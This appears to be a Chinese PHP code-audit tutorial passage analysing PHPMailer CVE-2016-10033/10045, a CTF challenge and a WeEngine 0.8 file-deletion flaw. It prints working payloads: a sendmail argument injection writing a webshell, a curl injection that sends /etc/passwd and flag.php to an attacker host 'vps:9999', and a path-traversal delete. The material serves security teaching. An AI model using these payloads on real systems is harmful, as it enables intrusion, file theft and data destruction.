<p>在上图第12行处没有对 <strong>$params</strong> 变量进行严格过滤，只是简单地判断是否为 <strong>null</strong> ，所以可以直接传入命令。我们继续往下看，我们发现在上图第12行，当 <strong>safe_mode</strong> 模式处于关闭状态时， <strong>mail()</strong> 函数才会传入 <strong>$params</strong> 变量。<br>进一步跟跟进 <strong>$params</strong> 参数，看看它是怎么来的。这个参数的位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码，具体看下图 <strong>第11行</strong> ： </p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png"></p>
<p>很明显 <strong>$params</strong> 是从 <strong>$this-&gt;Sender</strong> 传进来的，我们找一下 <strong>$this-&gt;Sender</strong> ，发现这个函数在 <strong>class.phpmailer.php</strong> 中，截取部分相关代码，具体看下图 <strong>第10行</strong> ：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png"></p>
<p>这里在 <strong>setFrom</strong> 函数中将 <strong>$address</strong> 经过某些处理之后赋值给 <strong>$this-&gt;Sender</strong> 。我们详细看看 <strong>$address</strong> 变量是如何处理的。主要处理函数均在 <strong>class.phpmailer.php</strong> 文件中，我们截取了部分相关代码，在下图 <strong>第三行</strong> 中使用了 <strong>validateAddress</strong> 来处理 <strong>$address</strong> 变量。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png"></p>
<p>所以跟进一下 <strong>validateAddress</strong> 函数，这个函数位置在 <strong>class.phpmailer.php</strong> 文件中。我们看看程序流程，相关代码如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png"></p>
<p>分析一下这段代码，大概意思就是对环境进行了判断，如果没有 <strong>prce</strong> 并且 <strong>php</strong> 版本 <strong>&lt;5.2.0</strong> ，则 <strong>$patternselect &#x3D; ‘noregex’</strong> 。接着往下看，在 <strong>class.phpmailer.php</strong> 文件中，有部分关于 <strong>$patternselect</strong> 的 <strong>swich</strong> 操作，我只选择了我们需要的那个，跟踪到下面的 <strong>noregex</strong> 。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png"></p>
<p>这里简单的只是根据 <strong>@</strong> 符号来处理字符，所以这里的payload很简单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>

<p>然后通过 <strong>linux</strong> 自身的 <strong>sendmail</strong> 写log的方式，把log写到web根目录下。将日志文件后缀定义为 <strong>.php</strong> ，即可成功写入webshell。</p>
<h4 id="CVE-2016-10045-1"><a href="#CVE-2016-10045-1" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>diff一下5.2.20和5.2.18发现针对 <strong>escapeshellcmd</strong> 和 <strong>escapeshellarg</strong> 做了改动。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png"></p>
<p>这里其实有个很奇妙的漏洞，针对用户输入使用 <strong>escapeshellarg</strong> 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>

<p>但是，却可以使用下面这个  <strong>payload</strong> 进行攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>

<p>实际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了  <strong>escapeshellcmd</strong> 函数，结合上 <strong>mail()</strong> 函数底层调用的 <strong>escapeshellarg</strong> 函数，最终导致单引号逃逸。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png"></p>
<p>我们的 <strong>payload</strong> 最终在执行时变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-fa&#x27;\\&#x27;&#x27;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#x27;</span><br></pre></td></tr></table></figure>

<p>按照刚才上面的分析，我们将payload化简分割一下就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，这四个部分。最终的参数就是这样被注入的。</p>
<p>漏洞利用</p>
<p>漏洞有一些基本要求：<br><strong>1、php version &lt; 5.2.0</strong><br><strong>2、phpmailer &lt; 5.2.18</strong><br><strong>3、php 没有安装 pcre（no default）</strong><br><strong>4、safe_mode &#x3D; false（default）</strong></p>
<p>存在正则绕过之后，以及 <strong>escapeshellarg</strong>  和 <strong>escapeshellcmd</strong> 一起使用造成的神奇现象之后。</p>
<p>只需要 <strong>phpmailer &lt; 5.2.20</strong> </p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/opsxcq/exploit-CVE-2016-10033">环境，poc，exp相关</a></strong></p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>我们来看一下 <strong>PHPMailer</strong> 官方给出的修复代码。官方对用户传入的参数进行检测，如果当中存在被转义的字符，则不传递 <strong>-f</strong> 参数（**-f** 参数表示发邮件的人，如果不传递该参数，我们的payload就不会被带入 <strong>mail</strong> 函数，也就不会造成命令执行），所以不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤，具体修复代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png"></p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>看完了上述分析，不知道大家是否对 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 两个函数一起使用所产生的问题，有了更加深入的理解，文中用到的代码可以从 <a target="_blank" rel="noopener" href="https://github.com/PHPMailer/PHPMailer">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <strong><a href="mailto:&#x68;&#x6f;&#x6e;&#x67;&#114;&#x69;&#x73;&#101;&#99;&#x40;&#x67;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#x68;&#x6f;&#x6e;&#x67;&#114;&#x69;&#x73;&#101;&#99;&#x40;&#x67;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a></strong> 联系我们。<strong>Day5</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题主要考察全局变量覆盖，结合 unset 函数绕过waf，以及通过 curl 读取文件，接下来我们将代码分为两个部分看看吧。我们看到 第11行-14行 有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析一下这串代码的逻辑：<br>首先 第一行 ，循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。在 第二行 中先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。这里有个 可变变量 的概念需要先理解一下。可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png"></p>
<p>这里使用 <strong>$$</strong> 将通过 <strong>变量a</strong> 获取到的数据，注册成为一个<strong>新的变量</strong>（这里是 <strong>变量hello</strong> ）。然后会发现变量 <strong>$$a</strong> 的输出数据和变量 <strong>$hello</strong>  的输出数据一致（如上图，输出为 <strong>world</strong> ）。</p>
<p>我通过 <strong>GET</strong> 请求向 <strong>index.php</strong> 提交 <strong>flag&#x3D;test</strong> ，接着通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> 。当开始遍历 <strong>$_POST</strong> 超全局数组的时候， <strong>$__k</strong> 代表 <strong>_GET[flag]</strong> ，所以 <strong>$$__k</strong> 就是 <strong>$_GET[flag]</strong> ，即 <strong>test</strong> 值，此时 <strong>$$__k</strong> &#x3D;&#x3D; <strong>$__v</strong> 成立，变量 <strong>$_GET[flag]</strong> 就被 <strong>unset</strong> 了。但是在 <strong>第21行</strong> 和 <strong>22行</strong> 有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br></pre></td></tr></table></figure>

<p> <strong>extract</strong> 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> ，所以这里会变成 <strong>$_GET[flag]&#x3D;test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘&#x2F;flag&#x2F;i’,$key)</strong> 的限制。下面举个 <strong>extract</strong> 函数用例：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png"></p>
<p>接着到了24行比较两个变量的md5值，我们构造出2个0e开头的md5即可绕过，这样就进入第二阶段。</p>
<p>第二阶段主要考察 <strong>curl</strong> 读取文件。这里主要加了两个坑，我们之前说过的两个函数 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 一起使用的时候会造成的问题，主要看看这部分代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的 <strong>第8行</strong> 和 <strong>第9行</strong> 增加了两个过滤。</p>
<ul>
<li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li>
<li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]&#123;&#125;$</code>, <code>x0A</code> 和 <code>xFF</code>, <code>&#39;</code> 和 <code>&quot;</code>仅在不配对儿的时候被转义。</li>
</ul>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png"></p>
<p>在字符串增加了引号同时会进行转义，那么之前的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure>

<p>因为增加了 <strong>‘</strong> 进行了转义，所以整个字符串会被当成参数。注意 <strong>escapeshellcmd</strong> 的问题是在于如果 <strong>‘</strong> 和 <strong>“</strong> 仅在不配对儿的时候被转义。那么如果我们多增加一个 <strong>‘</strong> 就可以扰乱之前的转义了。如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png"></p>
<p>在 <strong>curl</strong> 中存在 <strong>-F</strong> 提交表单的方法，也可以提交文件。 <strong>-F &lt;key&#x3D;value&gt;</strong> 向服务器POST表单，例如： <strong>curl -F “web&#x3D;@index.html;type&#x3D;text&#x2F;html” url.com</strong> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png"></p>
<p>这里应该是和 <strong>curl</strong> 版本有关系，我在 **7.54.0 ** 下没有测试成功。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png"></p>
<p>题目中的 <strong>curl</strong> 版本是 <strong>7.19.7</strong><br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png"></p>
<p>根据猜测，可能在是新版本中，先会执行 <strong>curl http</strong> 的操作，但是由于在后面增加了,例如 <strong><a target="_blank" rel="noopener" href="http://127.0.0.1,/">http://127.0.0.1，</a></strong> 但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。</p>
<h3 id="解题payload："><a href="#解题payload：" class="headerlink" title="解题payload："></a>解题payload：</h3><p>所以这题最后的 <strong>payload</strong> 是这样的。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&#x27;</span> -<span class="keyword">F</span> <span class="string">file=@/var/www/html/flag.php</span> -x <span class="string"></span> vps:9999 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"></span><br><span class="line"><span class="language-sqf"><span class="variable">_GET</span>[<span class="built_in">flag</span>]=QNKCDZO&amp;<span class="variable">_GET</span>[hongri]=s878926199a&amp;<span class="variable">_GET</span>[url]=http:<span class="comment">//baidu.com/&#x27; -F file=@/var/www/html/flag.php -x  vps:9999</span></span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a><br><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer 命令执行漏洞（CVE-2016-10033）分析</a></p>
<h2 id="Forst-Pattern"><a href="#Forst-Pattern" class="headerlink" title="Forst Pattern"></a>Forst Pattern</h2><p>题目叫福斯特模式，代码如下<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-25.png"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>这一关考察的内容是由正则表达式不严谨导致的任意文件删除漏洞， 导致这一漏洞的原因在 <strong>第19行</strong> ， <strong>preg_replace</strong> 中的 <strong>pattern</strong> 部分 ，该正则表达式并未起到过滤目录路径字符的作用。<code>[^a-z.-_]</code>  表示匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、**.** 字符到 <strong>_</strong> 字符之间的所有字符。因此，攻击者还是可以使用点和斜杠符号进行路径穿越，最终删除任意文件，例如使用 <strong>payload</strong> ： <code>action = delete＆data = ../../ config.php</code>，便可删除 <strong>config.php</strong> 文件。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。</p>
</blockquote>
<h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>WeEngine0.8</strong> 版本。漏洞入口文件为 <strong>web&#x2F;source&#x2F;site&#x2F;category.ctrl.php</strong> ，我们可以看到下图 <strong>14行</strong> 处调用了 <strong>file_delete</strong> 函数，而这是一个文件删除相关操作，我们可以看一下该函数的具体定义。下图是入口文件代码：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-26.png"></p>
<p> <strong>file_delete</strong> 这一函数可以在 <strong>framework&#x2F;function&#x2F;file.func.php</strong> 文件中找到，该方法功能用于检测文件是否存在，如果存在，则删除文件。但是查看上下文发现，程序并没有对文件名 <strong>$file</strong> 变量进行过滤，所以文件名就可以存在类似 <strong>..&#x2F;</strong> 这种字符，这样也就引发任意文件删除漏洞，<strong>file_delete</strong> 函数代码如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-27.png"></p>
<p>现在我们在回溯回去，看看 <strong>$file</strong> 变量从何处来。实际上，上图的 <strong>$file</strong> 变量对应的是 <strong>$row[‘icon’]</strong> 的值，也就是说如果我们可以控制 <strong>$row[‘icon’]</strong> 的值，就可以删除任意文件。那么我们来看看 <strong>$row</strong> 变量从何而来。该变量就在我们刚刚分析的第一张图片中( <strong>web&#x2F;source&#x2F;site&#x2F;category.ctrl.php</strong> 文件)，该值为变量 <strong>$navs</strong> 中的元素值，具体代码如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-28.png"></p>
<p>我们再往上看，即可找到 <strong>$navs</strong> 变量的取值情况。可以看到 <strong>$navs</strong> 变量的是从数据库 <strong>site_nav</strong> 表中取出的，包含了 <strong>icon</strong> 和 <strong>id</strong> 两个字段，具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$navs</span> = <span class="title function_ invoke__">pdo_fetchall</span>(<span class="string">&quot;SELECT icon, id FROM &quot;</span>.<span class="title function_ invoke__">tablename</span>(<span class="string">&#x27;site_nav&#x27;</span>).<span class="string">&quot; WHERE id IN (SELECT nid FROM &quot;</span>.<span class="title function_ invoke__">tablename</span>(<span class="string">&#x27;site_category&#x27;</span>).<span class="string">&quot; WHERE id = <span class="subst">&#123;$id&#125;</span> OR parentid = &#x27;<span class="subst">$id</span>&#x27;)&quot;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>现在我们要做的，就是找找看数据库中的这两个字段是否可以被用户控制。我们继续往前查找，发现了如下代码：<img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-29.png"></p>
<p><strong>site_nav</strong> 表中的数据，对应的是 <strong>$nav</strong> 变量。我们继续往上寻找 <strong>$nav</strong> 变量，发现 <strong>$nav[‘icon’]</strong> 变量是从 <strong>$_GPC[‘iconfile’]</strong> 来的，即可被用户控制( 下图 <strong>第21行</strong> )。这里的 <strong>$nav[‘icon’]</strong> 变量，其实就是我们文章开头分析的传入 <strong>file_delete</strong> 函数的参数，具体代码如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-30.png"></p>
<p>由于 <strong>$nav[‘icon’]</strong> 变量可被用户控制，程序有没有对其进行消毒处理，直接就传入了 <strong>file_delete</strong> 函数，最终导致了文件删除漏洞。至此，我们分析完了整个漏洞的发生过程，接下看看如何进行攻击。</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>访问url：<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=account&a=display">http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=account&amp;a=display</a> ，点击管理公众号：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-31.png"></p>
<p>找到分类设置，点击添加文章分类。这里对应的url为：<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=site&a=category%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%A1%A8%E7%A4%BA">http://xxx.xxx.xxx.xxx/WeEngine/web/index.php?c=site&amp;a=category，实际上表示</a> <strong>site</strong> 控制器的 <strong>category</strong> 模块，即对应 <strong>category.ctrl.php</strong> 文件。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-32.png"></p>
